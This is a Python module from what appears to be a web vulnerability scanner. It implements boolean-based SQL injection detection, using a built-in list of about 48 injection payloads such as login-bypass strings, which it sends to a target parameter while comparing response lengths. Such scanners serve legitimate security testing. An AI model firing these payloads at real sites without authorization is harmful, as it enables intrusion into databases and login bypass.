"""
Boolean-Based SQL Injection Engine
"""

import os
from utils.http_client import HttpClient

class BooleanEngine:
    def __init__(self):
        self.http_client = HttpClient()
        self.payloads_file = os.path.join("payloads", "boolean_payloads.txt")
        self.payloads = self._load_payloads()
    
    def _load_payloads(self):
        """Load boolean-based payloads from file"""
        default_payloads = [
            "' OR '1'='1", "' OR '1'='2", "' AND '1'='1", "' AND '1'='2",
            "' OR 1=1", "' OR 1=2", "' AND 1=1", "' AND 1=2",
            "1' OR '1'='1", "1' OR '1'='2", "1' AND '1'='1", "1' AND '1'='2",
            "admin' OR '1'='1", "admin' OR '1'='2",
            "' OR 'a'='a", "' OR 'a'='b", "' AND 'a'='a", "' AND 'a'='b",
            "' OR 1=1--", "' OR 1=2--", "' AND 1=1--", "' AND 1=2--",
            "' OR '1'='1'--", "' OR '1'='2'--",
            "') OR ('1'='1", "') OR ('1'='2", "') AND ('1'='1", "') AND ('1'='2",
            "\" OR \"1\"=\"1", "\" OR \"1\"=\"2", "\" AND \"1\"=\"1", "\" AND \"1\"=\"2",
            "' OR '1'='1' /*", "' OR '1'='2' /*", "' AND '1'='1' /*", "' AND '1'='2' /*",
            "' OR 1=1#", "' OR 1=2#", "' AND 1=1#", "' AND 1=2#",
            "1 OR 1=1", "1 OR 1=2", "1 AND 1=1", "1 AND 1=2",
            "1' OR '1'='1' OR '1'='1", "1' OR '1'='2' OR '1'='1",
            "' OR username='admin' OR '1'='1", "' OR username='admin' OR '1'='2"
        ]
        
        try:
            if os.path.exists(self.payloads_file):
                with open(self.payloads_file, 'r', encoding='utf-8') as f:
                    payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                return payloads[:50]
            else:
                print(f"   Payload file not found: {self.payloads_file}, using defaults")
                return default_payloads
        except Exception as e:
            print(f"   Error loading payloads: {e}, using defaults")
            return default_payloads
    
    def test(self, param, url):
        """Test for boolean-based SQL injection"""
        try:
            # Get baseline response
            baseline_response = self.http_client.get(url, {param: "1"})
            if not baseline_response:
                return None
            
            for payload in self.payloads:
                try:
                    # Test with true condition
                    test_response = self.http_client.get(url, {param: payload})
                    
                    if not test_response:
                        continue
                    
                    # Simple but effective boolean detection
                    baseline_len = len(baseline_response) if baseline_response else 0
                    test_len = len(test_response) if test_response else 0
                    
                    # Check for significant difference
                    if baseline_len > 0 and test_len > 0:
                        difference_ratio = abs(baseline_len - test_len) / baseline_len
                        
                        if difference_ratio > 0.3:  # 30% difference
                            return {
                                "vulnerable": True,
                                "payload": payload, 
                                "response": test_response,
                                "evidence": f"Response length changed from {baseline_len} to {test_len} (difference: {difference_ratio:.2%})"
                            }
                            
                except Exception as e:
                    continue
            
            return None
        except Exception as e:
            print(f"   Boolean test error: {e}")
            return None